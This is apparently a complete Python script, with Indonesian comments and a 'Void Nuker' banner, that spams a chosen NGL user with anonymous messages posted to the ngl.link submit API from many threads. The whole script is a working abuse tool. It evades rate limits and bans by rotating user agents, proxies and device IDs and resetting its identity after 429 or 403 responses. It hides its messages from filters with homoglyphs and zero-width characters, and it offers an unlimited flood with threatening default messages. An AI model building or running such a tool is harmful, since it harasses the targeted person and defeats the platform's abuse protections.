#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import subprocess, sys, os, requests, json, time, threading, random, string, uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode
from tqdm import tqdm

# ========== AUTO-INSTALL ==========
def install_deps():
    reqs = {
        'requests': 'requests',
        'colorama': 'colorama',
        'pysocks': 'PySocks',
        'tqdm': 'tqdm'
    }
    for mod, pkg in reqs.items():
        try:
            __import__(mod)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install_deps()
import colorama
from colorama import Fore, Back, Style
colorama.init()

# ========== CONFIG ==========
VERSION = "6.0"
DEV = "Marr"

BANNER = f"""{Fore.RED}
╦  ╦╔═╗╔╦╗╔╦╗  ╔═╗╦ ╦╔═╗╦═╗╔═╗
╚╗╔╝╠═╣║║║ ║   ║ ╦║ ║╠═╣╠╦╝║╣ 
 ╚╝ ╩ ╩╩ ╩ ╩   ╚═╝╚═╝╩ ╩╩╚═╚═╝
{Fore.CYAN}
╔═╗╔╦╗╔═╗╔═╗╦═╗╔═╗╔═╗╦  ╔═╗╦═╗
╠═╣ ║║╠═╣║ ║╠╦╝╠═╣║  ║  ║╣ ╠╦╝
╩ ╩═╩╝╩ ╩╚═╝╩╚═╩ ╩╚═╝╩═╝╚═╝╩╚═
{Fore.YELLOW}v{VERSION} - Dev: {DEV}
{Fore.MAGENTA}「 CUSTOM QUANTITY + ANTI RATE LIMIT 」{Style.RESET_ALL}"""

# 200+ USER AGENTS (campuran dari sebelumnya + tambahan)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    # ... (lo bisa tambahin semua agent yang udah ada)
]
# Generate tambahan biar gak kosong
for i in range(50):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.{random.randint(1000,9999)}.{random.randint(100,200)} Safari/537.36")
    USER_AGENTS.append(f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-S{random.randint(900,999)}B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.{random.randint(1000,9999)}.120 Mobile Safari/537.36")

ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en;q=0.7"]
ACCEPT_ENCS = ["gzip, deflate, br", "identity"]
REFFERERS = ["https://ngl.link/", "https://www.instagram.com/", "https://t.co/", ""]

class MarrNuker:
    def __init__(self, proxy_file=None):
        self.stats = {
            'sent': 0,
            'success': 0,
            'failed': 0,
            'rate_limited': 0,  # hitung retry karena 429
            'running': True,
            'lock': threading.Lock()
        }
        self.proxies = []
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file) as f:
                self.proxies = [line.strip() for line in f if line.strip()]

    def _get_session(self):
        s = requests.Session()
        ua = random.choice(USER_AGENTS)
        headers = {
            'User-Agent': ua,
            'Accept': random.choice(['application/json', '*/*', 'text/html']),
            'Accept-Language': random.choice(ACCEPT_LANGS),
            'Accept-Encoding': random.choice(ACCEPT_ENCS),
            'Origin': 'https://ngl.link',
            'Referer': random.choice(REFFERERS),
            'X-Requested-With': 'XMLHttpRequest'
        }
        s.headers.update(headers)
        if self.proxies:
            proxy = random.choice(self.proxies)
            s.proxies = {'http': proxy, 'https': proxy}
        return s

    def _obfuscate_text(self, text):
        # Sedikit variasi biar gak monoton
        methods = [
            lambda t: t.replace('a', 'а'),
            lambda t: t.replace('e', 'е'),
            lambda t: ''.join(c + '\u200B' if random.random() > 0.8 else c for c in t),
            lambda t: t
        ]
        return random.choice(methods)(text)

    def _craft_payload(self, target, message):
        device_templates = [
            f"android_{random.randint(1000000, 9999999)}",
            f"ios_{random.randint(1000000, 9999999)}",
            f"web_{random.randint(1000000, 9999999)}",
            uuid.uuid4().hex[:16]
        ]
        return {
            'username': target,
            'question': self._obfuscate_text(message),
            'deviceId': random.choice(device_templates),
            'gameSlug': '',
            'referrer': random.choice(['', '', 'instagram', 'tiktok', 'snapchat'])
        }

    def _rate_limit_wait(self, retry_count):
        """Exponential backoff + jitter untuk rate limit"""
        base = min(60, 2 ** retry_count)  # max 60 detik
        jitter = random.uniform(0, base * 0.5)
        wait = base + jitter
        time.sleep(wait)

    def _worker(self, thread_id, target, messages, delay, total_per_thread, burst):
        """Thread worker dengan rate limit handler dan target jumlah tertentu"""
        session = self._get_session()
        sent = 0
        retry_count = 0
        max_retry = 5

        while self.stats['running'] and sent < total_per_thread:
            try:
                msg = random.choice(messages)
                payload = self._craft_payload(target, msg)
                resp = session.post("https://ngl.link/api/submit", data=payload, timeout=10)
                
                with self.stats['lock']:
                    self.stats['sent'] += 1
                    if resp.status_code == 200 and 'ok' in resp.text.lower():
                        self.stats['success'] += 1
                    elif resp.status_code == 429:
                        self.stats['rate_limited'] += 1
                        self.stats['failed'] += 1
                        # Rate limit handler
                        self._rate_limit_wait(retry_count)
                        retry_count += 1
                        if retry_count <= max_retry:
                            session = self._get_session()  # ganti identitas
                            continue  # jangan break, coba lagi tanpa hitung sent
                        else:
                            # Reset retry, lanjut aja
                            retry_count = 0
                    else:
                        self.stats['failed'] += 1
                        # Mungkin blokir lain
                        if resp.status_code in [403]:
                            session = self._get_session()
                            time.sleep(random.uniform(2, 5))
                sent += 1
                # Delay normal
                time.sleep(random.uniform(0.01, delay) if burst else random.uniform(delay/2, delay*2))
                retry_count = 0  # reset jika sukses
            except Exception as e:
                with self.stats['lock']:
                    self.stats['failed'] += 1
                time.sleep(random.uniform(1, 3))
        return sent

    def launch_attack(self, target, messages, threads=10, delay=0.5, total_messages=0, burst=False):
        """
        total_messages: jumlah total pesan yang ingin dikirim.
        Jika 0, berarti unlimited (tidak ada batasan).
        """
        self.stats = {
            'sent': 0,
            'success': 0,
            'failed': 0,
            'rate_limited': 0,
            'running': True,
            'lock': threading.Lock()
        }
        if total_messages == 0:
            # Unlimited: setiap thread jalan tanpa batas (quantity infinite)
            per_thread = float('inf')
        else:
            # Bagi rata ke semua thread, sisanya ditanggung thread pertama
            per_thread_base = total_messages // threads
            remainder = total_messages % threads
            # Kita akan set per thread dengan nilai integer
            # Kirim parameter "total_per_thread" ke worker, untuk thread[i] = per_thread_base + (1 if i < remainder else 0)
            # Gunakan closure atau kirim via list
            per_thread_list = [per_thread_base + (1 if i < remainder else 0) for i in range(threads)]
        
        print(f"\n{Fore.GREEN}[+] Meluncurkan serangan ke @{target}")
        print(f"{Fore.CYAN}[+] {threads} Thread | Delay: {delay}s | Mode: {'BURST' if burst else 'NORMAL'}")
        if total_messages > 0:
            print(f"[+] Target total pesan: {total_messages}")
        else:
            print(f"[+] Unlimited mode")
        print(f"{Style.RESET_ALL}\n")

        start_time = time.time()
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(threads):
                # Tentukan jumlah per thread untuk thread ini
                if total_messages == 0:
                    tq = float('inf')
                else:
                    tq = per_thread_list[i]
                futures.append(executor.submit(self._worker, i+1, target, messages, delay, tq, burst))
            
            # Progress bar dengan tqdm yang bisa menangani unknown total jika unlimited
            pbar = tqdm(total=total_messages if total_messages > 0 else None,
                        bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]' if total_messages > 0 else '{l_bar}{bar}| {n_fmt} [{elapsed}, {rate_fmt}]',
                        desc="Spamming")
            try:
                while self.stats['running']:
                    pbar.n = self.stats['sent']
                    pbar.set_postfix(Success=self.stats['success'], Failed=self.stats['failed'],
                                     RateLimited=self.stats['rate_limited'],
                                     Rate=f"{self.stats['sent']/(time.time()-start_time):.1f}/s")
                    pbar.refresh()
                    time.sleep(0.1)
                    # Cek apakah semua future selesai
                    if all(f.done() for f in futures):
                        break
            except KeyboardInterrupt:
                self.stats['running'] = False
                print(f"\n{Fore.RED}[!] Dihentikan oleh pengguna.{Style.RESET_ALL}")
            finally:
                pbar.close()

        elapsed = time.time() - start_time
        success_rate = (self.stats['success']/self.stats['sent']*100) if self.stats['sent']>0 else 0
        print(f"\n{Fore.YELLOW}═══ HASIL AKHIR ═══")
        print(f"✓ Terkirim: {self.stats['sent']}")
        print(f"✓ Sukses: {self.stats['success']} ({success_rate:.1f}%)")
        print(f"✓ Gagal: {self.stats['failed']}")
        print(f"✓ Rate Limit (429): {self.stats['rate_limited']}")
        print(f"✓ Durasi: {elapsed:.1f}s")
        if elapsed > 0:
            print(f"✓ Kecepatan: {self.stats['sent']/elapsed:.1f} msg/s")
        print(Style.RESET_ALL)

# ========== MENU UTAMA ==========
def main():
    os.system('clear')
    print(BANNER)
    
    target = input(f"{Fore.CYAN}[?] Username NGL target: {Style.RESET_ALL}").strip()
    if not target: return
    
    # Custom pesan
    print(f"\n{Fore.YELLOW}--- Custom Pesan ---{Style.RESET_ALL}")
    print("Masukkan pesan spam (satu per baris). Ketik 'done' jika selesai.")
    custom_msgs = []
    while True:
        msg = input(f"{Fore.CYAN}  Pesan: {Style.RESET_ALL}")
        if msg.lower() == 'done':
            break
        elif msg.strip() == '':
            continue
        custom_msgs.append(msg.strip())
    if not custom_msgs:
        # Default
        custom_msgs = [
            "VOID NUKER X - MARR EDITION",
            "CHAOS IS HERE",
            "BERGABUNGLAH DENGAN KEKUATAN GELAP",
            "TIDAK ADA YANG AMAN"
        ]
        print(f"{Fore.GREEN}[!] Menggunakan pesan default.{Style.RESET_ALL}")
    
    # Threads
    threads = int(input(f"{Fore.CYAN}[?] Jumlah Thread (1-200): {Style.RESET_ALL}") or 10)
    
    # Delay
    delay = float(input(f"{Fore.CYAN}[?] Delay per pesan (detik, 0.1-5): {Style.RESET_ALL}") or 0.5)
    
    # Jumlah total pesan (quantity)
    qty_input = input(f"{Fore.CYAN}[?] Total pesan yang dikirim (0 = unlimited): {Style.RESET_ALL}")
    try:
        total_msgs = int(qty_input) if qty_input.strip() else 0
    except:
        total_msgs = 0
    
    # Mode burst?
    burst_in = input(f"{Fore.CYAN}[?] Mode (NORMAL/BURST): {Style.RESET_ALL}").strip().lower()
    burst = burst_in == 'burst'
    
    nuker = MarrNuker(proxy_file="proxies.txt" if os.path.exists("proxies.txt") else None)
    nuker.launch_attack(target, custom_msgs, threads, delay, total_msgs, burst)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Keluar.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")